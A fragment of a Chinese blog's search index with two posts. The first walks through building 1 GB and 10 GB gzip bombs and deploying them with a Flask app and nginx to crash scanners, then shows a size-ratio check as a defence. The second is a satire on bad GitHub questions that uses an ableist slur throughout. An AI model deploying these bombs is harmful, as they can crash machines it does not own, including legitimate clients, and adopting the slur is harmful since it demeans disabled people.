\u538b\u7f29\u5305\u70b8\u5f39\u5bf9\u6076\u610f\u626b\u63cf\u5668\u8fdb\u884c\u53cd\u51fb\u3002","title":"\u72e0\u4e00\u70b9\u7684\u5904\u7406\u65b9\u6cd5\uff08\u672c\u756a\uff09"},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_4","text":"\u9996\u5148\u7b80\u8981\u4ecb\u7ecd\u4e0b\u4ec0\u4e48\u662f\u538b\u7f29\u5305\u70b8\u5f39\uff08\u4e5f\u53eb zip \u70b8\u5f39\uff09\uff1a \u4ec0\u4e48\u662f\u538b\u7f29\u5305\u70b8\u5f39 \u4e00\u4e2a zip \u70b8\u5f39\u901a\u5e38\u662f\u4e00\u4e2a\u5c0f\u6587\u4ef6\uff0c\u4fbf\u4e8e\u4f20\u8f93\u4e5f\u907f\u514d\u88ab\u6000\u7591\u3002\u4f46\u662f\uff0c\u89e3\u538b\u7f29\u6587\u4ef6\u65f6\uff0c\u5b83\u7684\u5185\u5bb9\u5c31\u4f1a\u8d85\u51fa\u7cfb\u7edf\u7684\u5904\u7406\u80fd\u529b\u3002zip \u70b8\u5f39\u4e0d\u4f1a\u963b\u6b62\u7a0b\u5e8f\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u800c\u662f\u8ba9\u7a0b\u5e8f\u5de5\u4f5c\uff0c\u4f46\u662f\u6587\u4ef6\u91cc\u7684\u6863\u6848\u662f\u7cbe\u5fc3\u8bbe\u8ba1\u7684\uff0c\u56e0\u6b64\u8981\u89e3\u538b\u7f29\u6587\u4ef6\u65f6\uff08\u6bd4\u5982\u7528\u75c5\u6bd2\u626b\u63cf\u7a0b\u5e8f\u6765\u7ed9\u5b83\u626b\u63cf\u75c5\u6bd2\uff09\uff0c\u5c31\u9700\u8981\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u3001\u78c1\u76d8\u7a7a\u95f4\u548c\u5185\u5b58\u3002 \u7ef4\u57fa\u767e\u79d1 \u4e5f\u5c31\u662f\u8bf4\u5c0f\u5c0f\u7684\u51e0\u5341 KB \u7684\u538b\u7f29\u5305\u53ef\u4ee5\u89e3\u538b\u51fa\u6570 GB \u7684\u6570\u636e\uff0c\u518d\u5927\u4e00\u70b9\u7684\u538b\u7f29\u5305\u751a\u81f3\u53ef\u4ee5\u89e3\u538b\u51fa\u51e0 TB \u751a\u81f3\u51e0 PB \u7684\u6570\u636e\u3002 \u5982\u679c\u5c1d\u8bd5\u5c06\u8fd9\u4e9b\u6570\u636e\u89e3\u538b\u5728\u786c\u76d8\u91cc\uff0c\u5219\u4f1a\u5bfc\u81f4\u786c\u76d8 IO \u76f4\u63a5100%\uff1b\u5982\u679c\u5c1d\u8bd5\u5c06\u8fd9\u4e9b\u6570\u636e\u89e3\u538b\u5230\u5185\u5b58\u4e2d\uff0c\u4f1a\u5bfc\u81f4\u5185\u5b58\u5360\u7528\u7387\u4e0d\u65ad\u4e0a\u5347\uff0c\u76f4\u5230 OOM\u3002","title":"\u4ec0\u4e48\u662f\u538b\u7f29\u5305\u70b8\u5f39"},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#gzip","text":"\u73b0\u4ee3\u6d4f\u89c8\u5668\u4e2d\uff08\u5f53\u7136\u4e5f\u5305\u62ec\u5404\u4e2a\u8bed\u8a00\u7684\u7f51\u7edc\u8bf7\u6c42\u5e93\uff0c\u4f8b\u5982 python \u7684 requests \uff09\u901a\u5e38\u90fd\u53ef\u4ee5\u5904\u7406\u4ee5 gzip \u65b9\u5f0f\u538b\u7f29\u7684 html \u54cd\u5e94\uff08\u8f7d\u8377\uff09\u3002 \u8bbe\u60f3\u4e00\u4e2a\u626b\u63cf\u5668\uff0c\u4ed6\u5c1d\u8bd5\u901a\u8fc7\u4f60\u7684\u516c\u7f51 IP \u626b\u63cf\u4f60\u7684\u670d\u52a1\u5668\uff0c\u6211\u4eec\u4ece\u67d0\u4e9b\u65b9\u5f0f\u4e86\u89e3\u5230\u8fd9\u662f\u4e00\u4e2a\u626b\u63cf\u5668\u540e\uff0c\u6545\u610f\u8fd4\u56de\u4e00\u4e2a\u4ee5 gzip \u65b9\u5f0f\u538b\u7f29\u7684 html \u54cd\u5e94\uff0c\u4f46\u662f\u8fd9\u4e2a\u54cd\u5e94\u5728\u89e3\u538b\u51fa\u6765\u4e4b\u540e\u6709\u8db3\u8db3\u6570 GB\uff0c\u4f1a\u600e\u4e48\u6837\uff1f \u6ca1\u9519\uff0c\u8fd9\u4e2a\u53ef\u601c\u800c\u611a\u8822\u7684\u626b\u63cf\u5668\u4f1a\u8bd5\u56fe\u89e3\u538b\u8fd9\u4e2a\u8f7d\u8377\uff0c\u968f\u540e\uff0c\u4ed6\u5185\u5b58\u5c06\u4f1a\u88ab\u6570 GB \u7684\u5783\u573e\u6240\u586b\u6ee1\uff0c\u7136\u540e OOM\u3002 \u8fd9\u5c31\u662f\u6211\u4eec\u60f3\u8981\u8fbe\u5230\u7684\u6548\u679c\u2014\u2014\u4f7f\u7528 gzip \u538b\u7f29\u5305\u70b8\u5f39\u53cd\u51fb\u6076\u610f\u626b\u63cf\u5668\u3002","title":"gzip \u538b\u7f29\u5305\u70b8\u5f39\u5982\u4f55\u5de5\u4f5c"},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_5","text":"\u4e3a\u4e86\u6d4b\u8bd5\uff0c\u9996\u5148\u5236\u9020\u4e00\u4e2a\u4ec5\u5305\u542b test \u4e3a\u5185\u5bb9\u7684\u538b\u7f29\u6587\u4ef6\u4f5c\u4e3a\u8f7d\u8377\uff1a echo \"test\" | gzip > test.gzip \u6211\u4eec\u90e8\u7f72\u4e00\u4e2a\u7b80\u6613\u7684 Flask \u670d\u52a1\u5668\uff0c\u5e76\u8ba9\u5176\u5c06\u6211\u4eec\u5728\u4e0a\u6587\u5236\u9020\u7684 test.gzip \u4f5c\u4e3a\u538b\u7f29\u540e\u7684\u54cd\u5e94\uff1a app.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from flask import Flask , Response , request import logging app = Flask ( __name__ ) @app . route ( '/' , defaults = { 'path' : '' }) @app . route ( '/<path:path>' ) def send_gzip_bomb ( path ): remote_addr = request . headers . get ( 'X-Forwarded-For' , request . remote_addr ) app . logger . info ( f 'client [ { remote_addr } ] { request . method } [ { request . host } ] as { request . url } ' ) app . logger . info ( f 'User-Agent: { request . headers . get ( \"User-Agent\" ) } ' ) with open ( r 'static/test.gzip' , 'rb' ) as payload_gzip : resp = payload_gzip . read () final_response = Response ( response = resp , status = 200 , mimetype = 'text/html' ) final_response . headers [ 'Content-Encoding' ] = 'gzip' return final_response if __name__ == '__main__' : logging . basicConfig ( filename = 'flask.log' , level = logging . INFO ) app . run ( host = '127.0.0.1' , port = 8082 ) \u8fd9\u4e2a\u7b80\u6613\u7684 Flask \u670d\u52a1\u5668\u7684\u4ee3\u7801\u4e2d\u6709\u4ee5\u4e0b\u8981\u70b9\uff1a \u7b2c7\u884c - @app . route ( '/' , defaults = { 'path' : '' }) \uff1a\u5f53\u5339\u914d\u5230 '/' \u7684\u8def\u7531\u65f6\uff08\u6bd4\u5982\u76f4\u63a5\u8bbf\u95ee http:// + \u4f60\u7684\u516c\u7f51 IP \u5730\u5740 \uff09\uff0c\u5c06 send_gzip_bomb \u51fd\u6570\u7684 path \u53c2\u6570\u8bbe\u7f6e\u6210 '' \u7b2c8\u884c - @app . route ( '/<path:path>' )) \uff1a\u5f53\u5339\u914d\u5230\u4efb\u4f55\u5e26 path \u7684\u8def\u7531\u65f6\uff0c\u5c06 send_gzip_bomb \u51fd\u6570\u7684 path \u53c2\u6570\u8bbe\u7f6e\u6210 URL \u4e2d\u7684 path \u503c \u5982\u6b64\u4e00\u6765\uff0c\u8fd9\u4e2a send_gzip_bomb \u51fd\u6570\u4fbf\u80fd\u6355\u83b7\u6240\u6709\u7684\u8def\u7531\uff08\u5373\u4f7f\u51fd\u6570\u4e2d\u4ece\u672a\u4f7f\u7528 path \u53c2\u6570\uff09\u3002 \u7b2c10\u884c - 'X-Forwarded-For' \uff1a\u53d6\u51fa\u8bf7\u6c42\u5934\u4e2d\u7684 X-Forwarded-For \u7684\u503c\uff0c\u4ece\u800c\u77e5\u9053\u662f\u8c01\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u670d\u52a1\u5668\u3002\u5982\u679c\u76f4\u63a5\u4f7f\u7528 request . remote_addr \uff0c\u90a3\u4e48\u67e5\u770b\u5230\u7684\u5730\u5740\u6c38\u8fdc\u90fd\u662f 127.0.0.1 \uff0c\u56e0\u4e3a\u8fd9\u4e2a\u8bf7\u6c42\u662f\u4ece\u672c\u5730\u7684 nginx \u53d1\u6765\u7684 \u63d0\u793a \u4f7f\u7528 X-Real-IP \u66ff\u4ee3 X-Forwarded-For \u540c\u6837\u4e5f\u53ef\u4ee5\uff0c\u524d\u63d0\u662f\u8fd9\u4e24\u4e2a\u503c\u5728 nginx \u53cd\u4ee3\u65f6\u5df2\u7ecf\u88ab\u5b9a\u4e49\u3002 \u89c1 \u90e8\u7f72\u4e8e nginx \u7b2c16\u884c - mimetype = 'text/html' \uff1a\u5728\u54cd\u5e94\u5934\u4e2d\u6307\u5b9a\u54cd\u5e94\u7c7b\u578b\u4e3a\u6587\u672c\uff0c\u8fd9\u6837\u88ab\u5bb3\u7684\u626b\u63cf\u5668\u670d\u52a1\u5668\u4fbf\u4f1a\u65e0\u6761\u4ef6\u89e3\u538b\u6211\u4eec\u53d1\u6765\u7684\u8f7d\u8377 \u7b2c17\u884c - final_response . headers [ 'Content-Encoding' ] = 'gzip' \uff1a\u540c\u4e0a\uff0c\u544a\u77e5\u88ab\u5bb3\u7684\u626b\u63cf\u5668\u670d\u52a1\u5668\u4f7f\u7528 gzip \u89e3\u538b\u8f7d\u8377 \u7b2c22\u884c - filename = 'flask.log' \uff1a\u5c06 Flask \u7684\u65e5\u5fd7\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\uff0c\u65b9\u4fbf\u6211\u4eec\u8bb0\u5f55\u662f\u8c01\u6076\u610f\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u670d\u52a1\u5668 \u73b0\u5728\uff0c\u8fd0\u884c\u8fd9\u4e2a Flask \u670d\u52a1\u5668\uff0c\u5e76\u8bbf\u95ee http://127.0.0.1:8082 \u3002 \u53ef\u4ee5\u770b\u5230\uff0c\u6d4f\u89c8\u5668\u6210\u529f\u8fd8\u539f\u4e86 test \u7684\u6587\u672c\u5185\u5bb9\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5236\u4f5c\u4e00\u4e9b\u9ad8\u538b\u7f29\u7387\u7684\u8f7d\u8377\u3002 dd if = /dev/zero bs = 1M count = 1024 | gzip > 1G.gzip dd if = /dev/zero bs = 1M count = 10240 | gzip > 10G.gzip \u53d7\u5236\u4e8e DEFLATE \u7684\u6781\u9650\u538b\u7f29\u7387\uff0c\u4e0a\u8ff0\u4e24\u4e2a\u6587\u4ef6\u6700\u591a\u80fd\u88ab\u538b\u7f29\u5230\u5176\u539f\u6765\u5927\u5c0f\u7684\u7ea6 1/1000\u3002\u5373\u7ea6 1 MB \u7684 1G.gzip \u548c \u7ea6 10 MB \u7684 10G.gzip \u3002 \u7136\u540e\u518d\u8bbf\u95ee\u4e00\u6b21 http://127.0.0.1:8082 \u3002 \u53ef\u4ee5\u89c1\u5230\u5185\u5b58\u5360\u7528\u6b63\u5728\u4e0d\u65ad\u4e0a\u6da8\uff0c\u56e0\u4e3a\u6211\u6015\u6211\u7535\u8111 OOM \u6240\u4ee5\u5c31\u6ca1\u6709\u7ee7\u7eed\u6d4b\u8bd5\u4e0b\u53bb\u4e86\u3002","title":"\u5236\u9020\u5e76\u90e8\u7f72\u5728\u672c\u5730"},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#nginx","text":"\u73b0\u5728\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u90e8\u7f72\u5230\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u6837\u624d\u80fd\u5c06\u5176\u4f5c\u4e3a\u53cd\u51fb\u5de5\u5177\u4f7f\u7528\u3002 \u4fee\u6539\u5148\u524d\u63d0\u5230\u7684 nginx \u7684\u914d\u7f6e\uff1a nginx.conf\uff08\u90e8\u5206\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 server { listen 80 default_server ; listen [::]:80 default_server ; server_name _ ; # \u4f7f\u7528 zipbomb_server \u6765\u7528\u6b66\u529b\u89e3\u51b3\u626b\u63cf\u5668\u95ee\u9898 location / { proxy_set_header Host $host ; proxy_set_header X-Real-IP $remote_addr ; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for ; proxy_pass http://127.0.0.1:8082 ; } } server { listen 80 ; listen [::]:80 ; server_name localhost 127 .0.0.1 ; ... } \u4e4b\u524d\u6211\u4eec\u662f return 403 ; \uff0c\u73b0\u5728\u6211\u4eec\u628a default_server \u6240\u5728\u7684 server \u6dfb\u52a0\u4e00\u4e2a / \u7684 location \uff0c\u5e76\u5c06\u539f\u6765\u8fd4\u56de403\u6539\u4e3a\u53cd\u4ee3\u5230 127.0.0.1:8082 \u3002 \u6ce8\u610f\u7b2c10\u884c\uff0c\u6211\u4eec\u9700\u8981\u5411\u53cd\u4ee3\u7684\u8bf7\u6c42\u5934\u4e2d\u653e\u4e0a\u4e00\u4e2a X-Forwarded-For \uff0c\u4ee5\u8868\u793a nginx \u5e2e\u52a9\u54ea\u4e2a\u5ba2\u6237\u7aef\u8fdb\u884c\u4e86\u53cd\u5411\u4ee3\u7406\u3002\u6b64\u65f6\u6211\u4eec\u7684 Flask \u670d\u52a1\u5668\u624d\u80fd\u77e5\u9053\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u670d\u52a1\u5668\u7684\u5ba2\u6237\u7aef\u7684 IP \u5730\u5740\u3002 \u5982\u6b64\u4e00\u6765\uff0c\u6240\u6709\u901a\u8fc7\u6211\u4eec\u670d\u52a1\u5668\u7684\u516c\u7f51 IP \u5730\u5740\u8bbf\u95ee\u670d\u52a1\u566880\u7aef\u53e3\u7684\u8fde\u63a5\uff0c\u65e0\u8bba path \u4e3a\u5982\u4f55\uff0c\u5747\u4f1a\u88ab\u53cd\u4ee3\u5230 Flask \u670d\u52a1\u5668\u4e0a\uff0c\u7136\u540e Flask \u670d\u52a1\u5668\u8fd4\u56de\u4e00\u4e2a 10G \u7684 gzip \u70b8\u5f39\uff0c\u662f\u4e0d\u662f\u5f88\u70ab\u9177\uff1f","title":"\u90e8\u7f72\u4e8e nginx"},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_6","text":"\u6700\u4e3b\u8981\u7684\u9884\u9632\u65b9\u6cd5\u5c31\u662f\u5728\u67e5\u770b\u54cd\u5e94\u5185\u5bb9\u4e4b\u524d\u68c0\u67e5\u54cd\u5e94\u7684\u539f\u59cb\u5927\u5c0f\u3002 import gzip import io import requests import sys resp = requests . get ( url ) compressed = resp . raw . read () compressed_size = sys . getsizeof ( compressed ) with gzip . open ( io . BytesIO ( compressed ), 'rb' ) as g : g . seek ( 0 , 2 ) origin_size = g . tell () print ( compressed_size , origin_size ) \u5176\u4e2d origin_size \u53cd\u6620\u7684\u662f\u8f7d\u8377\u89e3\u538b\u4e4b\u540e\u7684\u5927\u5c0f\uff0c compressed_size \u53cd\u6620\u7684\u662f\u8f7d\u8377\u538b\u7f29\u540e\u7684\u5927\u5c0f\uff08\u4e5f\u662f\u5b9e\u9645\u4f20\u8f93\u7684\u5927\u5c0f\uff09\uff0c\u5b83\u4eec\u7684\u5355\u4f4d\u90fd\u662f B\u3002 \u5982\u679c\u53d1\u73b0\u8fd9\u4e24\u4e2a\u503c\u7684\u6bd4\u503c\u8fc7\u5927\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8f7d\u8377\u5f88\u6709\u53ef\u80fd\u662f\u538b\u7f29\u5305\u70b8\u5f39\u3002","title":"\u9884\u9632\u65b9\u6cd5"},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/","tags":["github"],"text":"\u8fd9\u7bc7\u6587\u7ae0\u81f4\u529b\u4e8e\u544a\u8bc9\u8bfb\u8005\u5982\u4f55\u50cf\u4e00\u4e2a\u5f31\u667a\u4e00\u6837\u63d0\u95ee\uff0c\u4ee5\u53ca\u5982\u4f55\u5728\u63d0\u95ee\u65f6\u6fc0\u6012\u4f60\u7684\u56de\u7b54\u8005\u3002 \u8bf7\u6ce8\u610f\uff0c\u672c\u6587\u4e3b\u8981\u7684\u8ba8\u8bba\u91cd\u70b9\u662f \u201c\u5982\u4f55\u50cf\u4e00\u4e2a\u5f31\u667a\u201d\uff0c\u800c\u4e0d\u662f \u201c\u5982\u4f55\u6fc0\u6012\u4f60\u7684\u56de\u7b54\u8005\u201d\uff0c\u6545\u8bf8\u5982 \u63d0\u95ee\u6001\u5ea6 \u3001 \u641c\u7d22\u5df2\u5b58\u5728\u7684 issue \u7b49\u4e0d\u5728\u6b64\u6587\u7684\u8ba8\u8bba\u8303\u56f4\u5185\u3002 \u5f00\u5c40\u4e00\u53e5\u8bdd\uff0c\u5185\u5bb9\u5168\u9760\u731c \u00b6 \u4e4b\u6240\u4ee5\u5c06\u5176\u653e\u5728\u8fd9\u7bc7\u535a\u5ba2\u4e2d\u6700\u663e\u773c\u7684\u4f4d\u7f6e\uff0c\u662f\u56e0\u4e3a\u8be5\u65b9\u6cd5\u662f\u6fc0\u6012\u56de\u7b54\u8005\u6700\u6709\u6548\u7684\u65b9\u6cd5\u3002 \u8be5\u65b9\u6cd5\u7684\u5173\u952e\u5728\u4e8e\uff1a\u4e0d\u8981\u5728\u63d0\u95ee\u4e2d\u63d0\u4f9b\u4efb\u4f55\u5185\u5bb9\uff08\u4f8b\u5982 \u590d\u73b0\u6b65\u9aa4 \u3001 \u65e5\u5fd7 \u3001 \u73af\u5883 \u4ee5\u53ca \u8f6f\u4ef6\u7248\u672c \u7b49\uff09\uff0c\u8fd9\u4e9b\u5185\u5bb9\u5c06\u6709\u52a9\u4e8e\u56de\u7b54\u8005\u66f4\u597d\u5730\u7406\u89e3\u95ee\u9898\uff0c\u56e0\u800c\u65e0\u6cd5\u4f53\u73b0\u4f60\u662f\u4e00\u4e2a\u5f31\u667a\u3002 \u4f8b 1 \u5f00\u5c40\u4e00\u53e5\u8bdd\uff0c\u5185\u5bb9\u5168\u9760\u731c \u6709\u4e00\u4e2a\u5b6a\u751f\u5144\u5f1f\uff0c\u90a3\u5c31\u662f \u5f00\u5c40\u4e00\u5f20\u56fe\uff0c\u5185\u5bb9\u5168\u9760\u731c \uff0c\u4f8b\u5982\uff1a \u4f8b 2 \u63d0\u793a\uff1a\u7531\u4e8e\u4f60\u8ba4\u4e3a\u56de\u7b54\u8005\u7684\u601d\u8003\u9891\u7387\u6c38\u8fdc\u548c\u4f60\u662f\u76f8\u540c\u7684\uff0c\u6545\u5728\u63d0\u95ee\u65f6\u65e0\u9700 \u82b1\u65f6\u95f4\u7ec4\u7ec7\u597d\u8bed\u8a00 \uff0c\u8fd9\u79cd\u4e0d\u660e\u6240\u4ee5\u7684\u95ee\u9898\u53ef\u4ee5\u8d77\u5230\u706b\u4e0a\u6d47\u6cb9\u7684\u4f5c\u7528\u3002 \u4f60\u4e5f\u8bb8\u4f1a\u89c1\u5230\u4e00\u4e9b\u63d0\u95ee\u8005\u5728\u63cf\u8ff0\u81ea\u5df1\u60f3\u8981\u7684\u529f\u80fd\u6216 bug \u7684\u884c\u4e3a\u65f6 \u52a0\u5165\u4e00\u4e9b\u793a\u8303 \uff0c\u4f8b\u5982\uff1a \u6240\u8fdb\u884c\u7684\u64cd\u4f5c \u671f\u5f85\u7684\u7ed3\u679c \u5b9e\u9645\u7684\u7ed3\u679c \u8bf7\u4e0d\u8981\u5b66\u4e60\u4ed6\u4eec\uff0c\u56e0\u4e3a\u4ed6\u4eec\u4e0d\u662f\u5f31\u667a\u3002 \u8be2\u95ee\u4e0d\u53ef\u601d\u8bae\u7684\u9884\u5907\u77e5\u8bc6\u95ee\u9898 \u00b6 \u4e00\u822c\u6765\u8bf4\uff0c\u4efb\u4f55\u4e00\u4e2a\u9879\u76ee\u90fd\u662f\u5199\u7ed9\u6709\u4e00\u5b9a\u9884\u5907\u77e5\u8bc6\u7684\u7528\u6237\u7684\u3002\u8fd9\u4e9b\u6240\u8c13\u7684\u9884\u5907\u77e5\u8bc6\uff0c\u4e00\u822c\u662f\u6307\u4f7f\u7528\u8be5\u9879\u76ee\uff08\u6216\u8005\u90e8\u7f72\u3001\u8fd0\u884c\u3001\u4fee\u6539\u7b49\uff09\u6240\u9700\u7684\u6700\u57fa\u672c\u7684\u6280\u80fd\u3002\u6216\u8bb8\u5bf9\u4e8e\u4e0d\u540c\u6c34\u5e73\u7684\u4eba\u6765\u8bf4\uff0c\u8fd9\u4e9b\u6240\u8c13\u7684\u9884\u5907\u77e5\u8bc6\u6807\u51c6\u53ef\u80fd\u4e0d\u5c3d\u76f8\u540c\uff0c\u4f46\u662f\u5728\u67d0\u4e9b\u7279\u5b9a\u7684\u5730\u65b9\uff0c\u8fd9\u4e9b\u9884\u5907\u77e5\u8bc6\u662f\u516c\u8ba4\u7684\u3002 \u4f8b\u5982\u5728\u4e16\u754c\u4e0a\u7edd\u5927\u90e8\u5206\u5f00\u6e90\u9879\u76ee\u4e2d\uff0c \u82f1\u8bed \u662f\u9884\u5907\u77e5\u8bc6 \u4f8b\u5982\u5728\u4e00\u4e2a\u5b8c\u5168\u57fa\u4e8e Python \u7684\u9879\u76ee\u4e2d\uff0c Python \u7684\u5b89\u88c5 \u662f\u9884\u5907\u77e5\u8bc6 \u4f8b\u5982\u5728\u4e00\u4e2a\u7f51\u7edc\u76f8\u5173\u7684\u9879\u76ee\u4e2d\uff0c IP \u5730\u5740\u548c\u7aef\u53e3 \u662f\u9884\u5907\u77e5\u8bc6 \u4f8b\u5982\u5728\u4e00\u4e2a\u88ab\u7528\u4e8e\u7535\u8111\u7684\u9879\u76ee\u4e2d\uff0c \u7535\u8111\u7684\u5f00\u5173\u673a \u662f\u9884\u5907\u77e5\u8bc6 \u4f8b\u5982\u5728\u6570\u5b66\u4e2d\uff0c \u56db\u5219\u8fd0\u7b97 \u662f\u9884\u5907\u77e5\u8bc6 \u5411\u5f31\u667a\u63d0\u4f9b\u8fd9\u4e9b\u6700\u57fa\u7840\u7684\u77e5\u8bc6\u663e\u7136\u4e0d\u662f\u793e\u533a\u7684\u4e49\u52a1\u4e4b\u4e00\uff0c\u56e0\u6b64\u5982\u679c\u4f60\u60f3\u8ba9\u56de\u7b54\u8005\u8ba4\u4e3a\u4f60\u662f\u4e00\u4e2a\u5f31\u667a\uff08\u6216\u8005\u8bf4\uff0c\u53d6\u60a6\u4f60\u7684\u56de\u7b54\u8005\uff09\uff0c\u90a3\u4e48\u5f53\u4f60\u9047\u5230\u8fd9\u4e9b\u95ee\u9898\u65f6\uff0c\u4f60\u5e94\u8be5\u7acb\u5373\u8be2\u95ee\u4ed6\u4eec\uff0c\u800c\u4e0d\u662f \u82b1 5 \u5206\u949f\u81ea\u884c\u5b66\u4e60\u8fd9\u4e9b\u9884\u5907\u77e5\u8bc6 \u3002\u4f8b\u5982\uff1a \u4f8b 3 Q: apk \u662f\u4ec0\u4e48\uff1f\u5728\u54ea\u91cc\u4e0b\u8f7d\u554a\uff1f\u7cfb\u7edf\u7981\u6b62\u6211\u5b89\u88c5\u600e\u4e48\u529e\u554a\uff1f \u50cf\u4e0a\u8ff0\u8fd9\u79cd\u53ef\u4ee5\u7528\u4e00\u4e2a\u5e76\u4e0d\u590d\u6742\u7684\u53e5\u5b50\u63cf\u8ff0\u7684\u9884\u5907\u77e5\u8bc6\u95ee\u9898\uff0c\u4f60\u5927\u591a\u90fd\u662f\u53ef\u4ee5\u5728 \u641c\u7d22\u5f15\u64ce \uff08\u4f8b\u5982 \u767e\u5ea6 \u6216\u8005 Google \uff09\u6216\u8005 \u8bba\u575b \uff08\u5982 Stack Overflow \uff09\u4e0a\u627e\u5230\u8fd9\u4e9b\u95ee\u9898\u7684\u7b54\u6848\u7684\u3002 \u5411\u4f60\u7684\u56de\u7b54\u8005\u8be2\u95ee\u8fd9\u4e9b\u9884\u5907\u77e5\u8bc6\u95ee\u9898\u6216\u8bb8\u4e5f\u662f\u4e00\u4e2a\u6fc0\u6012\u4ed6\u4eec\u7684\u65b9\u6848\uff0c\u8fd9\u53ef\u4ee5\u8ba9\u4ed6\u4eec\u89c9\u5f97\uff1a\u4e0e\u5176\u82b1\u65f6\u95f4\u4e3a\u8fd9\u4e2a\u5f31\u667a\u89e3\u51b3 \u600e\u4e48\u8ba9\u7535\u8111\u5173\u673a \u3001 \u600e\u4e48\u4f7f\u7528\u9f20\u6807 \u3001 \u5982\u4f55\u4e3a\u624b\u673a\u5145\u7535 \u8fd9\u7c7b\u95ee\u9898\uff0c\u4e0d\u5982\u8ba9\u4ed6\u53bb\u641c\u7d22\u5f15\u64ce\u4e0a\u641c\u7d22\u7b54\u6848\u6765\u5f97\u5feb\u3002 \u5728\u67e5\u770b\u6587\u6863\u524d\u63d0\u51fa\u95ee\u9898 \u00b6 \u4e00\u4e9b\u5f00\u53d1\u8005\u53ef\u80fd\u4f1a\u5728\u81ea\u5df1\u7684\u9879\u76ee\u4e3b\u9875\u7684\u660e\u663e\u4f4d\u7f6e\u63d0\u4f9b\u6587\u6863\uff0c\u8fd9\u4e9b\u6587\u6863\u91cc\u53ef\u80fd\u63d0\u4f9b\u4e86\u4f60\u4f7f\u7528\u8be5\u9879\u76ee\u7684\u5fc5\u8981\u8bf4\u660e\u3002\u4f5c\u4e3a\u60f3\u8981\u6210\u4e3a\u5f31\u667a\u7684\u4eba\uff0c\u4f60\u5e94\u8be5\u4e0d\u8981\u82b1\u65f6\u95f4 \u67e5\u770b\u8fd9\u4e9b\u6587\u6863 \u3002 \u5982\u4f55\u77e5\u9053\u81ea\u5df1\u5df2\u7ecf\u53d8\u6210\u5f31\u667a\uff1f\uff08\u6216\u8005\u8bf4\u5982\u4f55\u53d1\u73b0\u81ea\u5df1\u53ef\u80fd\u5df2\u7ecf\u6fc0\u6012\u4e86\u5176\u4ed6\u56de\u7b54\u8005\uff09 \u5f53\u4f60\u53d1\u73b0\u81ea\u5df1\u7684\u56de\u7b54\u8005\u91cc\u6709\u4eba\u8ba9\u4f60\u53bb\u770b\u6587\u6863\u65f6\uff0c\u4f8b\u5982\uff1a \u4f8b 4 \u6b64\u65f6\u4f60\u5c31\u5df2\u7ecf\u53d8\u6210\u5f31\u667a\u4e86\u3002 \u8be2\u95ee\u4e0d\u76f8\u5173\u7684\u95ee\u9898 \u00b6 \u6ce8\u610f \u8fd9\u91cc\u7279\u6307 GitHub issue \u4e2d\u53ef\u80fd\u51fa\u73b0\u7684\u60c5\u5f62\u3002 GitHub \u7684 issue \u662f\u7528\u4e8e\u5411\u4ed3\u5e93\u4e2d\u7684\u9879\u76ee\u63d0\u95ee\u3001\u53d1\u8d77\u5efa\u8bae\u6216\u5bfb\u6c42\u5e2e\u52a9\u7684\u5730\u65b9\u3002\u5982\u679c\u4f60\u60f3\u8ba9\u81ea\u5df1\u6210\u4e3a issue \u63d0\u95ee\u8005\u4e2d\u6700\u9753\u7684\u4ed4\uff0c\u4f60\u53ef\u4ee5\u5728 issue \u4e2d\u63d0\u51fa\u4e0e\u539f\u9879\u76ee\u6beb\u4e0d\u76f8\u5173\u7684\u95ee\u9898\u3002 \u4f8b 5 Q: requests.exceptions.Timeout: HTTPConnectionPool(host='google.com', ... \u662f\u4ec0\u4e48\u610f\u601d\uff1f A: \u5927\u9646\u8bbf\u95ee\u4e0d\u4e86\uff0c\u9700\u8981\u4f7f\u7528\u4ee3\u7406 Q: \u4ece\u54ea\u91cc\u53ef\u4ee5\u641e\u5230\u4ee3\u7406\u554a\uff1f \u81ea\u5df1\u9009\u62e9\u7684\u9053\u8def\u6c38\u8fdc\u662f\u6b63\u786e\u7684 \u00b6 \u5728\u63d0\u51fa\u95ee\u9898\u7684\u65f6\u5019\uff0c\u4f60\u7684\u8111\u6d77\u4e2d\u5e94\u5f53\u59cb\u7ec8\u8ba4\u4e3a \u201c\u81ea\u5df1\u9009\u62e9\u7684\u9053\u8def\u6c38\u8fdc\u662f\u6b63\u786e\u7684\u201d\uff0c\u56e0\u4e3a\u4f60\u65e0\u9700\u5411\u56de\u7b54\u8005 \u63cf\u8ff0\u4f60\u7684\u6839\u672c\u95ee\u9898 \u3002 \u4e0e\u4e4b\u8bf4\u6cd5\u6700\u63a5\u8fd1\u7684\u662f X-Y \u95ee\u9898 \uff0c\u8fd9\u6307\u7684\u662f\uff1a X-Y \u95ee\u9898 \u4f60\u5728\u63d0\u95ee\u65f6\u53ef\u80fd\u6709\u4e00\u4e2a\u9ad8\u7ea7\u5c42\u6b21\u95ee\u9898 X \uff0c\u4f60\u89c9\u5f97\u89e3\u51b3\u4e86 Y \u8fd9\u4e2a\u4f4e\u7ea7\u5c42\u6b21\u95ee\u9898\u4fbf\u80fd\u89e3\u51b3 X \u8fd9\u4e2a\u9ad8\u7ea7\u5c42\u6b21\u95ee\u9898\u3002\u4e8e\u662f\u4f60\u5728\u793e\u533a\u8be2\u95ee Y \u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u6700\u7ec8\u793e\u533a\u5e2e\u4f60\u89e3\u51b3 Y \u95ee\u9898\u4e4b\u540e\uff0c\u53d1\u73b0 Y \u95ee\u9898\u7684\u89e3\u51b3\u5e76\u4e0d\u80fd\u5e2e\u52a9 X 